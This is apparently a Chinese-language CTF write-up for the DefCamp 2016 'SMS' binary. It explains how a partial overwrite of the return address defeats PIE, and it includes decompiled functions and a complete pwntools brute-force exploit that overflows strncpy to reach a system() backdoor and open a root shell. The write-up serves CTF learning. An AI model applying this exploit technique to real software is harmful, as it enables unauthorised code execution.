---
layout: post
title: pwn DefCampCTF2016 SMS
excerpt: "DefCampCTF2016 SMS wirteup"
categories: [Writeup]
comments: true
---

PIE(position-independent executable, 地址无关可执行文件技术就是一个针对代码段`.text`, 数据段`.*data`，`.bss`等固定地址的一个防护技术。

本文通过partial write绕过PIE

partial write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数(就是最后的1.5个字节)的地址是始终不变的。

由于程序是小端序,所以覆盖return addr的时候会从后往前覆盖,因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP

最终就是写入1.5个字节的地址,爆破0.5个字节的地址,完成绕过PIE保护

checksec
```python
>>> from pwn import *
>>> print ELF('./SMS').checksec()
[*] '/root/sploitfun/DefCamp_CTF_2016/SMS'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
通过ida查看到程序中的后门地址,通过查看frontdoor的汇编代码我们知道其地址后三位是0x900
```
int frontdoor()
{
  char s; // [sp+0h] [bp-80h]@1

  fgets(&s, 128, _bss_start);	//将消息读取到s中,然后运行这个后门
  return system(&s);
}
```
```
.text:0000000000000900                 push    rbp
.text:0000000000000901                 mov     rbp, rsp
.text:0000000000000904                 add     rsp, 0FFFFFFFFFFFFFF80h
.text:0000000000000908                 mov     rdx, cs:__bss_start ; stream
.text:000000000000090F                 lea     rax, [rbp+s]
.text:0000000000000913                 mov     esi, 80h        ; n
.text:0000000000000918                 mov     rdi, rax        ; s
.text:000000000000091B                 call    _fgets
.text:0000000000000920                 lea     rax, [rbp+s]
.text:0000000000000924                 mov     rdi, rax        ; command
.text:0000000000000927                 call    _system
.text:000000000000092C                 nop
.text:000000000000092D                 leave
```
set_user得知name的地址在a1 + 140
```c
int __fastcall set_user(__int64 a1)
{
  char s[140]; // [sp+10h] [bp-90h]@1
  int i; // [sp+9Ch] [bp-4h]@1

  memset(s, 0, 0x80uLL);
  puts("Enter your name");
  printf("> ", 0LL);
  fgets(s, 128, _bss_start);		//读128个字符到s中
  for ( i = 0; i <= 40 && s[i]; ++i )
    *(_BYTE *)(a1 + i + 140) = s[i];		//最多向a1中写入40个字节
  return printf("Hi, %s", a1 + 140);
}
```
而set_sms中,strncpy的长度保存在a1 + 180
```c
char *__fastcall set_sms(__int64 a1)
{
  char s; // [sp+10h] [bp-400h]@1

  memset(&s, 0, 0x400uLL);
  puts("SMS our leader");
  printf("> ", 0LL);
  fgets(&s, 1024, _bss_start);		//读1024个字符到s中
  return strncpy((char *)a1, &s, *(_DWORD *)(a1 + 180));	//写入的长度受setname控制,造成栈溢出
}
```
从而可以通过name,控制set_sms中strncpy的长度
```
int dosms()
{
  char v1; // [sp+0h] [bp-C0h]@1
  int v2; // [sp+8Ch] [bp-34h]@1
  int v3; // [sp+B4h] [bp-Ch]@1

  memset(&v2, 0, 0x28uLL);
  v3 = 140;
  set_user((__int64)&v1);
  set_sms((__int64)&v1);
  return puts("SMS delivered");
}
```
payload如下
```
payload = 'a'*40                                        #padding
payload += '\xca'                                        #修改长度为202，即payload的长度，这个参数会在其后的strncpy被使用
io.sendline(payload)
io.recv()
payload = 'a'*200                                        #padding
payload += '\x01\xa9'                                #frontdoor的地址后三位是0x900, +1跳过push rbp
io.sendline(payload)
```
我们看到注释里用的不是0x900而是0x901，这是因为在实际调试中发现跳转到frontdoor时会出错。为了验证payload的正确性，我们可以在调试时通过IDA修改内存地址修正爆破位的值，此处从略。

最终payload
```python
#!/usr/bin/python
#coding:utf-8
from pwn import *

context.update(arch = 'amd64', os = 'linux')
i = 0

while True:
	i += 1
	print i
	io = process('SMS')
	io.recv()
	payload = 'a'*40					#padding
	payload += '\xca'					#修改长度为202，即payload的长度，这个参数会在其后的strncpy被使用
	io.sendline(payload)
	io.recv()
	payload = 'a'*200					#padding
	payload += '\x01\xa9'				#frontdoor的地址后三位是0x900, +1跳过push rbp
	io.sendline(payload)
	io.recv()
	try:
		io.recv(timeout = 1)			#要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发EOFError
	except EOFError:
		io.close()
		continue
	else:
		sleep(0.1)
		io.sendline('/bin/sh\x00')
		sleep(0.1)
		io.interactive()				#没有EOFError的话就是爆破成功，可以开shell
		break
```
最终结果
```
[+] Starting local process './SMS': pid 24042
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) 组=0(root)
```